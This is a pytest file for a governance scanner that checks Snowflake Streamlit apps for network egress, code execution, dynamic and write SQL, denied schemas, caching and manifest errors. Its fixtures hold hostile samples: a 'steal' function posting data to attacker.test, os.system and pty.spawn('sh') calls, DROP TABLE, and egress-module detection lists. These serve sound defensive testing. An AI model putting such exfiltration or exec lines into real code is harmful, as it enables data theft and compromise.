"""Tests for the governance checks + the validate-app aggregate gate."""

from __future__ import annotations

from pathlib import Path

import yaml

from streamsnow.config import Config
from streamsnow.policy import SchemaPolicy
from streamsnow.scaffolder import scaffold
from streamsnow.tools import check_app_security, check_bind_predicates, check_caching
from streamsnow.tools.check_schema_refs import find_denied_refs
from streamsnow.tools.validate_app import validate_app

REPO_ROOT = Path(__file__).resolve().parent.parent
EXAMPLE = REPO_ROOT / "streamsnow.config.example.yaml"


def _cfg() -> Config:
    return Config.from_dict(yaml.safe_load(EXAMPLE.read_text()))


def _write(p: Path, text: str) -> Path:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)
    return p


def test_security_flags_egress_exec_and_dynamic_sql(tmp_path):
    # dynamic-sql is only a finding when the f-string is the SQL ARGUMENT to a
    # .sql()/.query() call — not a bare assignment (FP class D3).
    p = _write(
        tmp_path / "a.py",
        "import requests\nimport os\nos.system('x')\n"
        "def f(c, t):\n    return c.query(f'SELECT * FROM {t}')\n",
    )
    res = check_app_security.scan_paths([p])
    kinds = {f["kind"] for f in res["findings"]}
    assert not res["ok"]
    assert {"egress", "code-exec", "dynamic-sql"} <= kinds


def test_security_flags_write_sql(tmp_path):
    p = _write(tmp_path / "w.sql", "DELETE FROM analytics.t WHERE x=1\n")
    assert not check_app_security.scan_paths([p])["ok"]


def test_security_clean_on_readonly(tmp_path):
    p = _write(tmp_path / "ok.py", "import streamlit as st\nimport plotly.express as px\n")
    assert check_app_security.scan_paths([p])["ok"]


def test_bind_predicate_trap_flagged(tmp_path):
    p = _write(tmp_path / "q.sql", "SELECT 1 WHERE (:1 IS NULL OR col = :1)\n")
    assert not check_bind_predicates.scan_paths([p])["ok"]


def test_caching_flags_uncached_fetch_and_respects_noqa(tmp_path):
    bad = _write(
        tmp_path / "bad.py",
        "import streamlit as st\ndef load():\n    return st.connection('snowflake').query('SELECT 1')\n",
    )
    assert not check_caching.scan_paths([bad])["ok"]
    ok = _write(
        tmp_path / "ok.py",
        "import streamlit as st\n@st.cache_data(ttl=1800)\ndef load():\n    return st.connection('snowflake').query('SELECT 1')\n",
    )
    assert check_caching.scan_paths([ok])["ok"]
    noqa = _write(
        tmp_path / "n.py",
        "import streamlit as st\ndef load():  # noqa: cache-required\n    return st.connection('snowflake').query('SELECT 1')\n",
    )
    assert check_caching.scan_paths([noqa])["ok"]


def test_caching_flags_cache_data_without_ttl(tmp_path):
    nott = _write(
        tmp_path / "nott.py",
        "import streamlit as st\n@st.cache_data\ndef load():\n"
        "    return st.connection('snowflake').query('SELECT 1')\n",
    )
    res = check_caching.scan_paths([nott])
    assert not res["ok"]
    assert "without ttl" in res["findings"][0]["detail"]


def test_caching_flags_named_load_sql_loader(tmp_path):
    # render_sql / load_sql results are named queries that must be cached.
    bad = _write(
        tmp_path / "ld.py",
        "import streamlit as st\nfrom sql_loader import load_sql\n"
        "def fetch_x():\n    return st.connection('snowflake').query(load_sql('x'))\n",
    )
    assert not check_caching.scan_paths([bad])["ok"]


def test_caching_noqa_on_fetch_call_line(tmp_path):
    # noqa on the .query()/.sql() line (not just the def line) opts out — smoke tests
    # often carry it there (apps/test-streamlit-app/pages/overview.py pattern).
    nq = _write(
        tmp_path / "nq.py",
        "import streamlit as st\ndef load():\n    conn = st.connection('snowflake')\n"
        "    return conn.query('SELECT 1', ttl=0)  # noqa: cache-required\n",
    )
    assert check_caching.scan_paths([nq])["ok"]


def test_caching_skips_private_helper(tmp_path):
    # FP class D6: underscore-prefixed low-level helpers (_query_df, _run_query) must
    # not be flagged — the public loaders that call them carry the cache decorator.
    priv = _write(
        tmp_path / "priv.py",
        "import streamlit as st\ndef _query_df(sql):\n"
        "    return st.connection('snowflake').query(sql)\n",
    )
    assert check_caching.scan_paths([priv])["ok"]


def test_caching_skips_connection_session_factory(tmp_path):
    # FP class D6: a connection/session factory (get_session/_get_conn) returns a
    # handle but never calls .query()/.sql() to return data — not a fetch.
    fac = _write(
        tmp_path / "fac.py",
        "import streamlit as st\ndef get_session():\n    try:\n"
        "        from snowflake.snowpark.context import get_active_session\n"
        "        return get_active_session()\n    except Exception:\n"
        "        return st.connection('snowflake').session()\n",
    )
    assert check_caching.scan_paths([fac])["ok"]


def test_caching_skips_query_primitive_shim(tmp_path):
    # FP class D6: a connection-adapter method literally named query/sql defines the
    # fetch primitive (it does not consume a named query).
    shim = _write(
        tmp_path / "shim.py",
        "class SessionAdapter:\n    def query(self, sql, params=None, ttl=0):\n"
        "        return self._session.sql(sql, params=params).to_pandas()\n",
    )
    assert check_caching.scan_paths([shim])["ok"]


def test_caching_skips_generic_sql_executor(tmp_path):
    # FP class D6: a function that executes a runtime-built SQL string passed in
    # (fees_cortex.run_generated_sql) is a generic executor; cache belongs on the caller.
    ex = _write(
        tmp_path / "ex.py",
        "import streamlit as st\ndef run_generated_sql(statement):\n"
        "    limited = _wrap(statement)\n"
        "    return st.connection('snowflake').query(limited, ttl=0)\n",
    )
    assert check_caching.scan_paths([ex])["ok"]


def test_caching_walk_skips_dotted_dirs(tmp_path):
    # The file walk must skip .review/, .git/, etc. and only scan real app files.
    _write(
        tmp_path / ".review" / "junk.py",
        "import streamlit as st\ndef load():\n"
        "    return st.connection('snowflake').query('SELECT 1')\n",
    )
    files = check_caching._iter_py_files(tmp_path)
    assert not any(".review" in str(f) for f in files)


def test_validate_app_passes_on_scaffold(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "good-app")
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/good-app", policy, cfg)
    assert res["ok"], res["checks"]


def test_validate_app_skips_dotted_tooling_dirs(tmp_path):
    """A REVIEW note under .review/ that quotes a denied schema must NOT trip the gate."""
    cfg = _cfg()
    scaffold(cfg, tmp_path, "clean-app")
    app = tmp_path / "apps/clean-app"
    # Tooling artifacts that quote denied schemas / dynamic SQL — never app source.
    _write(
        app / ".review/REVIEW-2026-01-01.md",
        "Found `SELECT * FROM RAW.secrets` and import requests\n",
    )
    _write(app / ".git/config", "[core]\n")
    _write(app / "pages/__pycache__/x.cpython-311.pyc", "junk\n")
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(app, policy, cfg)
    assert res["ok"], res["checks"]


def test_security_flags_python_write_sql_and_format_sql(tmp_path):
    w = _write(
        tmp_path / "w.py",
        "import streamlit as st\ndef f():\n    return st.connection('x').query('DELETE FROM analytics.t')\n",
    )
    assert any(x["kind"] == "write-sql" for x in check_app_security.scan_paths([w])["findings"])
    d = _write(
        tmp_path / "d.py", "def f(c, t):\n    return c.query('SELECT * FROM {}'.format(t))\n"
    )
    assert any(x["kind"] == "dynamic-sql" for x in check_app_security.scan_paths([d])["findings"])


# --------------------------------------------------------------------------- #
# app-security: dogfood false-positive regressions (each must NOT flag)       #
# --------------------------------------------------------------------------- #
def test_security_fstring_outside_query_call_not_flagged_fp_d3(tmp_path):
    # FP D3: an f-string carrying SQL words but passed to st.caption / st.markdown,
    # or returned as a render_sql token fragment, is NOT dynamic-sql. Only the SQL
    # argument of a .sql()/.query() call counts.
    p = _write(
        tmp_path / "fp.py",
        "import streamlit as st\n"
        "def render(t, quoted):\n"
        "    st.caption(f'SELECT {t} rows shown')\n"
        '    st.markdown(f"<p>WHERE clause: {t}</p>")\n'
        "    return (\n"
        "        'AND AGENT_ID IN (SELECT AGENT_ID FROM REF '\n"
        "        f'WHERE NAME IN ({quoted}))'\n"
        "    )\n",
    )
    assert check_app_security.scan_paths([p])["ok"]


def test_security_bare_name_sql_arg_allowed_fp_d3(tmp_path):
    # FP D3: a pre-built query variable (sess.sql(sql)) is allowed.
    p = _write(tmp_path / "bare.py", "def f(sess, sql):\n    return sess.sql(sql)\n")
    assert check_app_security.scan_paths([p])["ok"]


def test_security_plus_concat_sql_flagged_p4(tmp_path):
    # P4: string concatenation at the SQL call site (.sql('...' + x)) is dynamic-sql.
    p = _write(tmp_path / "concat.py", "def f(c, t):\n    return c.sql('SELECT 1 FROM t' + t)\n")
    assert any(x["kind"] == "dynamic-sql" for x in check_app_security.scan_paths([p])["findings"])


def test_noqa_only_waives_dynamic_sql(tmp_path):
    # `# noqa: dynamic-sql` is the ONE sanctioned waiver (server-controlled
    # metadata commands). It must NOT be generalizable to silence egress /
    # code-exec / write-sql — those would be self-service security bypasses.
    ok = _write(
        tmp_path / "dyn.py",
        "def f(c, fqn):\n    return c.sql(f'DESC STREAMLIT {fqn}')  # noqa: dynamic-sql\n",
    )
    assert check_app_security.scan_paths([ok])["ok"]
    for snippet, kind in (
        ("import socket  # noqa: egress\n", "egress"),
        ("import os\nos.system('x')  # noqa: code-exec\n", "code-exec"),
        ("def f(c):\n    return c.query('DROP TABLE t')  # noqa: write-sql\n", "write-sql"),
    ):
        p = _write(tmp_path / f"{kind}.py", snippet)
        kinds = {x["kind"] for x in check_app_security.scan_paths([p])["findings"]}
        assert kind in kinds, f"{kind} must NOT be waivable via # noqa"


def test_cortex_rest_waiver_is_validated_not_blanket(tmp_path):
    # A valid Cortex Analyst shape passes; the same waiver abused to exfiltrate
    # (requests.post to an external URL) is flagged.
    valid = _write(
        tmp_path / "cortex_ok.py",
        "import os\nimport requests  # snowflake-cortex-rest\n"
        'SNOWFLAKE_HOST = os.environ["SNOWFLAKE_HOST"]\n'
        'CORTEX_ANALYST_ENDPOINT = "/api/v2/cortex/analyst/message"\n'
        'CORTEX_ANALYST_URL = f"https://{SNOWFLAKE_HOST}{CORTEX_ANALYST_ENDPOINT}"\n'
        "def _token():\n"
        '    with open("/snowflake/session/token") as fh:\n        return fh.read()\n'
        "def ask(payload):\n"
        "    return requests.post(CORTEX_ANALYST_URL, json=payload, headers={'Authorization': _token()})\n",
    )
    assert check_app_security.scan_paths([valid])["ok"], check_app_security.scan_paths([valid])[
        "findings"
    ]
    exfil = _write(
        tmp_path / "cortex_exfil.py",
        "import requests  # snowflake-cortex-rest\n"
        "def steal(df):\n    requests.post('https://attacker.test/x', json=df.to_dict())\n",
    )
    assert not check_app_security.scan_paths([exfil])["ok"]


def test_plain_requests_import_still_flagged(tmp_path):
    bad = _write(tmp_path / "plain.py", "import requests\n")
    assert any(x["kind"] == "egress" for x in check_app_security.scan_paths([bad])["findings"])


def test_security_egress_submodule_granularity_p5(tmp_path):
    # P5: harmless stdlib (urllib.parse, from http import HTTPStatus) is not egress;
    # ssl/websocket(s)/imaplib/pycurl/xmlrpc/poplib are.
    clean = _write(
        tmp_path / "clean.py",
        "import urllib.parse\nfrom http import HTTPStatus\nfrom urllib.parse import quote\n",
    )
    assert check_app_security.scan_paths([clean])["ok"]
    for mod in ("ssl", "websocket", "websockets", "imaplib", "pycurl", "xmlrpc", "poplib"):
        p = _write(tmp_path / f"{mod}_egress.py", f"import {mod}\n")
        assert any(x["kind"] == "egress" for x in check_app_security.scan_paths([p])["findings"]), (
            mod
        )


def test_security_exec_coverage_p6(tmp_path):
    # P6: os.execv*/os.spawn*, subprocess.getoutput/getstatusoutput, marshal.load(s),
    # pty.spawn are all code-exec.
    src = (
        "import os, subprocess, marshal, pty\n"
        "def f():\n"
        "    os.execv('a', [])\n"
        "    os.spawnv(0, 'a', [])\n"
        "    subprocess.getoutput('x')\n"
        "    subprocess.getstatusoutput('x')\n"
        "    marshal.loads(b'')\n"
        "    pty.spawn('sh')\n"
    )
    p = _write(tmp_path / "exec.py", src)
    n = sum(1 for x in check_app_security.scan_paths([p])["findings"] if x["kind"] == "code-exec")
    assert n == 6, n


def test_security_sql_write_noise_stripping_p2(tmp_path):
    # P2: write/DDL keywords inside comments, string literals, or AS-aliases in a
    # .sql file are NOT flagged; only statement-initial write verbs are.
    clean = _write(
        tmp_path / "clean.sql",
        "-- a comment with DELETE FROM t\n"
        "/* block CREATE TABLE x */\n"
        "SELECT col AS update_ts FROM t WHERE status = 'DELETED' AND note = 'please update';\n",
    )
    assert check_app_security.scan_paths([clean])["ok"]
    bad = _write(
        tmp_path / "bad.sql",
        "SELECT 1;\nDELETE FROM analytics.t WHERE x = 1;\nCREATE TABLE foo AS SELECT 1;\n",
    )
    kws = [
        x["detail"]
        for x in check_app_security.scan_paths([bad])["findings"]
        if x["kind"] == "write-sql"
    ]
    assert len(kws) == 2


def test_security_walk_skips_dotted_dirs(tmp_path):
    # The file walk must skip .review/, .git/, __pycache__ and only scan real app files.
    _write(tmp_path / "apps/x/.review/leak.py", "import requests\nimport os\nos.system('x')\n")
    _write(tmp_path / "apps/x/__pycache__/cached.py", "import requests\n")
    _write(tmp_path / "apps/x/streamlit_app.py", "import streamlit as st\n")
    assert check_app_security.main([str(tmp_path / "apps"), "--format", "json"]) == 0


def test_schema_refs_use_statement_and_read_exceptions():
    from streamsnow.policy import SchemaPolicy as SP

    policy = SP(database="DB", schema_allow=("ANALYTICS",), schema_deny=("RAW",))
    assert find_denied_refs("USE SCHEMA RAW;", policy)
    assert find_denied_refs("use schema raw", policy)
    exc = SP(
        database="DB",
        schema_allow=("ANALYTICS",),
        schema_deny=("RAW",),
        read_exceptions=("DB.RAW.SANCTIONED",),
    )
    assert not find_denied_refs("SELECT * FROM DB.RAW.SANCTIONED", exc)
    assert find_denied_refs("SELECT * FROM DB.RAW.OTHER", exc)


# --------------------------------------------------------------------------- #
# schema-refs: real detections must stay (.py SQL literals + .sql)            #
# --------------------------------------------------------------------------- #
def _deny_policy():
    from streamsnow.policy import SchemaPolicy as SP

    return SP(database="DB", schema_allow=("ANALYTICS", "REPORTING"), schema_deny=("BRIDGE", "RAW"))


def test_schema_refs_flags_real_sql_and_python_query():
    policy = _deny_policy()
    # .sql file: denied schema in a FROM clause.
    assert find_denied_refs("SELECT a FROM BRIDGE.T\n", policy)
    # .py: SQL literal passed to a query() call.
    assert find_denied_refs("conn.query('SELECT * FROM BRIDGE.T')", policy, is_python=True)
    # .py: SQL literal recognized by keyword even without a query() wrapper.
    assert find_denied_refs("sql = 'SELECT a FROM BRIDGE.T'", policy, is_python=True)


def test_schema_refs_reports_correct_multiline_literal_lineno():
    policy = _deny_policy()
    src = 'import streamlit\nx = 1\nsql = """\nSELECT a\nFROM BRIDGE.T\n"""\n'
    # BRIDGE is on file line 5 (inside the triple-quoted literal that opens on 3).
    assert find_denied_refs(src, policy, is_python=True) == [(5, "BRIDGE")]


# --------------------------------------------------------------------------- #
# schema-refs: dogfood false-positive regressions (each must NOT flag)        #
# --------------------------------------------------------------------------- #
def test_schema_refs_ignores_module_docstring_fp_d1():
    # FP D1: a denied schema named in a docstring documenting the ban.
    policy = _deny_policy()
    src = '"""Never query BRIDGE / RAW here; use the REPORTING passthrough."""\nimport os\n'
    assert find_denied_refs(src, policy, is_python=True) == []


def test_schema_refs_ignores_markdown_and_caption_prose_fp_d1():
    # FP D1: denied schema mentioned in st.markdown / st.caption prose (no SQL).
    policy = _deny_policy()
    md = (
        "import streamlit as st\n"
        'st.markdown("REPORTING-layer passthrough of `BRIDGE.VW_X`")\n'
        'st.caption("data flows RAW -> BRIDGE -> REPORTING")\n'
    )
    assert find_denied_refs(md, policy, is_python=True) == []


def test_schema_refs_two_part_tests_only_schema_position_fp_d2():
    # FP D2: only the schema-position segment is tested against the denylist.
    policy = _deny_policy()
    # BRIDGE in the *database* / trailing-object position -> not a hit.
    assert find_denied_refs("SELECT * FROM DB.BRIDGE", policy) == []
    # BRIDGE in the *schema* position (2-part SCHEMA.OBJECT) -> hit.
    assert find_denied_refs("SELECT * FROM BRIDGE.FOO", policy)
    # 3-part DB.SCHEMA.OBJECT tests the middle (schema) segment.
    assert find_denied_refs("SELECT * FROM DB.BRIDGE.T", policy)
    # An allowed schema in a 3-part ref is clean even with a noisy DB name.
    assert find_denied_refs("SELECT * FROM BI.REPORTING.VW", policy) == []


def test_schema_refs_check_paths_skips_dotted_dirs(tmp_path):
    from streamsnow.policy import SchemaPolicy as SP
    from streamsnow.tools.check_schema_refs import check_paths

    policy = SP(database="DB", schema_allow=("ANALYTICS",), schema_deny=("BRIDGE",))
    # A real review artifact under a dotted dir (.review/) must be skipped.
    review = _write(tmp_path / "apps/x/.review/stub.sql", "SELECT * FROM BRIDGE.T\n")
    # A real query under apps/x/queries must still be flagged.
    real = _write(tmp_path / "apps/x/queries/q.sql", "SELECT * FROM BRIDGE.T\n")
    res = check_paths([review, real], policy)
    files = {f["file"] for f in res["findings"]}
    assert str(real) in files
    assert str(review) not in files
    assert not res["ok"]


def test_validate_app_fails_on_invalid_manifest(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "m-app")
    (tmp_path / "apps/m-app/snowflake.yml").write_text("entities: [oops\n")  # invalid YAML
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/m-app", policy, cfg)
    by_name = {c["name"]: c["ok"] for c in res["checks"]}
    assert by_name["manifest"] is False
    assert res["ok"] is False


def test_validate_app_fails_on_violations(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "bad-app")
    _write(tmp_path / "apps/bad-app/pages/leak.py", "import requests\n")
    _write(tmp_path / "apps/bad-app/queries/bad.sql", "SELECT * FROM RAW.secrets\n")
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/bad-app", policy, cfg)
    by_name = {c["name"]: c["ok"] for c in res["checks"]}
    assert res["ok"] is False
    assert by_name["app-security"] is False
    assert by_name["schema-refs"] is False


# --------------------------------------------------------------------------- #
# Manifest runtime-rule regression tests (ported from validate_yaml.py).
# --------------------------------------------------------------------------- #
def _manifest(app_dir: Path):
    cfg = _cfg()
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(app_dir, policy, cfg)
    return {c["name"]: c for c in res["checks"]}, res


def test_manifest_container_missing_compute_pool_fails(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "c-app")
    yml = tmp_path / "apps/c-app/snowflake.yml"
    data = yaml.safe_load(yml.read_text())
    ent = next(iter(data["entities"].values()))
    del ent["compute_pool"]
    yml.write_text(yaml.safe_dump(data))
    by_name, res = _manifest(tmp_path / "apps/c-app")
    assert by_name["manifest"]["ok"] is False
    assert any("compute_pool" in p for p in by_name["manifest"]["findings"])
    assert res["ok"] is False


def test_manifest_container_wrong_runtime_name_fails(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "c2-app")
    yml = tmp_path / "apps/c2-app/snowflake.yml"
    data = yaml.safe_load(yml.read_text())
    ent = next(iter(data["entities"].values()))
    ent["runtime_name"] = "SYSTEM$WRONG_RUNTIME"
    yml.write_text(yaml.safe_dump(data))
    by_name, _ = _manifest(tmp_path / "apps/c2-app")
    assert by_name["manifest"]["ok"] is False
    assert any("runtime_name" in p for p in by_name["manifest"]["findings"])


def test_manifest_warehouse_with_compute_pool_fails(tmp_path):
    # Warehouse runtime, but a stray container-only field leaks in.
    data = yaml.safe_load(EXAMPLE.read_text())
    data["runtime"] = "warehouse"
    data["snowflake"]["objects"] = dict(data["snowflake"]["objects"])
    data["snowflake"]["objects"]["compute_pool"] = ""
    data["snowflake"]["objects"]["external_access_integration"] = ""
    cfg = Config.from_dict(data)
    scaffold(cfg, tmp_path, "w-app")
    yml = tmp_path / "apps/w-app/snowflake.yml"
    ydata = yaml.safe_load(yml.read_text())
    ent = next(iter(ydata["entities"].values()))
    ent["compute_pool"] = "STREAMLIT_POOL"  # forbidden in warehouse mode
    yml.write_text(yaml.safe_dump(ydata))
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/w-app", policy, cfg)
    by_name = {c["name"]: c for c in res["checks"]}
    assert by_name["manifest"]["ok"] is False
    assert any("compute_pool" in p for p in by_name["manifest"]["findings"])


def test_manifest_warehouse_env_yml_python_pin_fails(tmp_path):
    data = yaml.safe_load(EXAMPLE.read_text())
    data["runtime"] = "warehouse"
    data["snowflake"]["objects"] = dict(data["snowflake"]["objects"])
    data["snowflake"]["objects"]["compute_pool"] = ""
    data["snowflake"]["objects"]["external_access_integration"] = ""
    cfg = Config.from_dict(data)
    scaffold(cfg, tmp_path, "wpy-app")
    env = tmp_path / "apps/wpy-app/environment.yml"
    edata = yaml.safe_load(env.read_text())
    edata["dependencies"].append("python=3.11")  # the CREATE STREAMLIT landmine
    env.write_text(yaml.safe_dump(edata))
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/wpy-app", policy, cfg)
    by_name = {c["name"]: c for c in res["checks"]}
    assert by_name["manifest"]["ok"] is False
    assert any("python" in p for p in by_name["manifest"]["findings"])


def test_manifest_definition_version_must_be_2(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "dv-app")
    yml = tmp_path / "apps/dv-app/snowflake.yml"
    data = yaml.safe_load(yml.read_text())
    data["definition_version"] = 1
    yml.write_text(yaml.safe_dump(data))
    by_name, _ = _manifest(tmp_path / "apps/dv-app")
    assert by_name["manifest"]["ok"] is False
    assert any("definition_version" in p for p in by_name["manifest"]["findings"])


def test_manifest_query_warehouse_must_be_allowed(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "qw-app")
    yml = tmp_path / "apps/qw-app/snowflake.yml"
    data = yaml.safe_load(yml.read_text())
    ent = next(iter(data["entities"].values()))
    ent["query_warehouse"] = "SOME_RANDOM_WH"
    yml.write_text(yaml.safe_dump(data))
    by_name, _ = _manifest(tmp_path / "apps/qw-app")
    assert by_name["manifest"]["ok"] is False
    assert any("query_warehouse" in p for p in by_name["manifest"]["findings"])


def test_format_finding_renders_dicts_readably():
    from streamsnow.tools.validate_app import _format_finding

    assert (
        _format_finding({"file": "apps/x/q.sql", "line": 12, "schema": "RAW"})
        == "apps/x/q.sql:12 — RAW"
    )
    assert (
        _format_finding({"file": "apps/x/p.py", "line": 3, "kind": "egress", "detail": "requests"})
        == "apps/x/p.py:3 — egress requests"
    )
    assert _format_finding("snowflake.yml missing") == "snowflake.yml missing"
    # No raw dict repr should ever leak through.
    rendered = _format_finding({"file": "f", "line": 1, "func": "load", "detail": "missing cache"})
    assert "{" not in rendered
